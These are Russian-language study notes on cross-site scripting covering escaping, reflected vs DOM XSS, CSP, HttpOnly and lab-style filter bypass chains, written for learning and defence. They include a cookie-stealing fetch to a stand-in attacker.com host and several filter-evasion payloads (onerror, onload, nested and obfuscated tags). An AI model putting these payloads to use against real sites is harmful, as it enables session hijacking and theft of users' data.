*XSS (Cross-Site Scripting)* — инъекция в БРАУЗЕР ДРУГОГО пользователя. Ввод атакующего исполняется как JavaScript в браузере жертвы. Жертва — не сервер, а другой юзер; сервер — посредник, доставляющий вредоносный JS.
Механика: браузер исполняет любой JS на странице. Протащить свой <script> так, чтобы браузер жертвы выполнил. Пример: коммент <script>alert('XSS')</script> → сайт показал другим без обработки → их браузер выполнил.
Корень: смешение данных и кода (как SQLi/command), но интерпретатор — БРАУЗЕР. Ввод (данные) стал JavaScript (код).
Опасность: кража session cookie (угон сессии), действия от имени жертвы, кража данных со страницы, фишинг, кейлоггер. Контроль сессии жертвы.

*Экранирование (escaping)* — защита XSS. Замена спецсимволов HTML на безопасные текстовые эквиваленты (HTML-сущности): < → <  > → >  " → "  ' → '  & → &.
Без экранирования: <script> вставлен как тег → браузер ВЫПОЛНЯЕТ → XSS.
С экранированием: <script> → браузер видит ТЕКСТ, показывает буквами «<script>», НЕ выполняет.
Суть: превращает потенциальный код в безобидный текст. Браузер рисует < > как символы, не как разметку.
Это НЕ blocklist (не запрет символов, не фильтр тегов — обходится), а ПРЕОБРАЗОВАНИЕ: ввод структурно не может стать кодом (как параметризация в SQLi).
Принцип: экранировать ВЫВОД (при показе), под КОНТЕКСТ вставки (HTML-тело / атрибут / JS — правила разные).

*Reflected vs DOM*— разница В ТОМ, КТО ВСТАВЛЯЕТ ввод в страницу:
Reflected: ввод → на СЕРВЕР → сервер вставляет его в HTML-ответ → браузер выполняет. Сервер payload ВИДЕЛ (отразил). Уязвимость в серверном коде.
DOM: ввод (часто после # — на сервер НЕ уходит) → КЛИЕНТСКИЙ JS страницы сам читает URL и вставляет в DOM (innerHTML=location.hash) → выполняется. Сервер payload НЕ видел. Уязвимость в клиентском JS.
Аналогия: reflected — секретарь (сервер) переписал твою записку на доску; DOM — робот в комнате (клиентский JS) сам прочитал записку с двери и переписал, секретарь не видел.

*innerHTML* — свойство элемента: его HTML-содержимое. Чтение (что внутри) и запись (замена). ВАЖНО: вставляет строку КАК HTML — теги в ней становятся настоящими (<b> → жирный, <img onerror> → выполнится).
textContent — вставляет как ТЕКСТ (теги показываются буквами, не срабатывают). Безопасно.
DOM-XSS: element.innerHTML = ввод → теги из ввода выполняются. Защита — textContent вместо innerHTML для данных.

*Вырыв из контекста в XSS* (как ' в SQLi): смотришь, КУДА попал ввод, вырываешься соответствующим символом.
— в HTML-тело → сразу <script>alert(1)</script>
— в атрибут src="ВВОД" → "> закрывает кавычку+тег, вырыв в HTML → потом <script> или <img onerror>
— в JS-контекст → закрыть строку/скобку
Принцип общий с SQLi: закрыть текущий контекст (', "), вырваться в исполняемый (SQL / HTML / JS). Контекст диктует payload.

*Реальный impact XSS (не alert(1) — это лишь PoC):*
    1. Кража session cookie: fetch('attacker.com/steal?c='+document.cookie) → угон сессии, вход как жертва. Защита: флаг HttpOnly (JS не читает cookie).
    2. Действия от имени жертвы: fetch('/change-email',{POST}) с её сессией → смена email/пароля, перевод денег.
    3. Кража данных со страницы (из DOM), кейлоггер, фишинг.
Суть: XSS = произвольный JS в браузере жертвы с ЕЁ правами → контроль сессии. alert(1) = доказательство; реальный payload крадёт/действует.

*HttpOnly:* блокирует ЧТЕНИЕ cookie из JS (document.cookie не видит), но НЕ блокирует ИСПОЛЬЗОВАНИЕ. Браузер САМ прикладывает cookie к каждому запросу на сайт, независимо от JS.
→ Действия от имени жертвы работают ДАЖЕ с HttpOnly: fetch('/change-email',POST) — браузер сам приложит session cookie жертвы, JS его не читал, но запрос ушёл с сессией. Ты не крадёшь cookie — пользуешься уже аутентифицированным браузером.
Аналогия: карта в запечатанном конверте — номер не прочитать (HttpOnly), но турникет срабатывает сам (браузер прикладывает).
ВЫВОД: HttpOnly защищает от КРАЖИ cookie, НЕ от XSS. XSS вредит и с HttpOnly (действия от имени жертвы, кража данных со страницы/DOM). Решение XSS — не допустить выполнение JS (экранирование + CSP), а не только HttpOnly.

*Обход XSS-фильтров:* блокировка <script> бесполезна — JS выполняется без него, через обработчики событий:
<img src=x onerror=alert(1)>, <svg onload=...>, <body onload=...>, <input onfocus=.. autofocus>, <a href="javascript:..">, <iframe src="javascript:..">.
Обфускация фильтров: регистр (OnErRoR), кодирование (сущности/юникод), вложенность (<scr<script>ipt>).
Способов выполнить JS бесконечно → blocklist тегов дырявый (как везде). Защита — экранирование вывода (обезвредить ВСЁ) + CSP, не блокировка тегов. Шпаргалка: PortSwigger XSS cheat sheet.

*CSP (Content Security Policy)* — заголовок ответа, говорит браузеру, откуда выполнять скрипты. Defense in depth (страховка на случай прошляпленного экранирования).
Content-Security-Policy: script-src 'self' → JS только со своего домена, inline-скрипты (<script> в HTML) и чужие — БЛОКИРУЮТСЯ браузером. Даже протащенный XSS не выполнится (inline запрещён).
Ключевое: запрет inline-скриптов (большинство XSS — inline), запрет eval, allowlist доверенных доменов. Это ALLOWLIST источников JS (разрешить хорошее, не блокировать плохое).
CSP — НЕ замена экранированию, а ДОП. слой. Защита XSS = экранирование вывода (основа) + CSP (страховка). Кривой CSP (unsafe-inline, широкий allowlist) обходится.

*Зачем существует unsafe-inline:* строгий CSP блокирует ВЕСЬ inline-код (onclick="" в тегах, <script> в HTML, javascript: ссылки). На старых сайтах inline повсюду (тысячи мест) → строгий CSP ломает сайт. Переписать всё в .js + addEventListener — огромная работа. unsafe-inline чинит за 5 сек, не трогая код → соблазн.
Мотив: «включили CSP, сайт сломался, лень/некогда переписывать → unsafe-inline». Удобство vs безопасность (как shell vs прямой запуск). Задумывался как переходная опция, но многие ставят и забывают.
Безопасная альтернатива: nonce/hash — разрешить КОНКРЕТНЫЕ доверенные inline-скрипты. script-src 'self' 'nonce-abc123' + <script nonce="abc123">. Nonce случайный на каждый ответ, атакующий не знает → его inline блокируется, легитимные работают. Allowlist конкретных скриптов вместо всех inline.

*Продвинутый XSS при жёсткой фильтрации:*
    1. Перебор вектора через Intruder (Cluster bomb): списки тегов × событий (PortSwigger cheat sheet), 200 = прошло фильтр, 400 "not allowed" = блок.
    2. ВАЖНО: «прошло фильтр» ≠ «сработает». Выбирать САМОСРАБАТЫВАЮЩЕЕ событие (onresize, onload), не требующее действий юзера.
    3. Доставка: onresize сам не сработает → обернуть в <iframe src="...payload..." onload=this.style.width='100px'> → iframe меняет размер → resize внутри → срабатывает. Через exploit server доставить жертве.
Урок: XSS вглубь = цепочка (обход фильтра + самосрабатывающее событие + доставка), не одиночный payload. Арсенал тегов/событий набирается через задачи, не зубрёжкой.
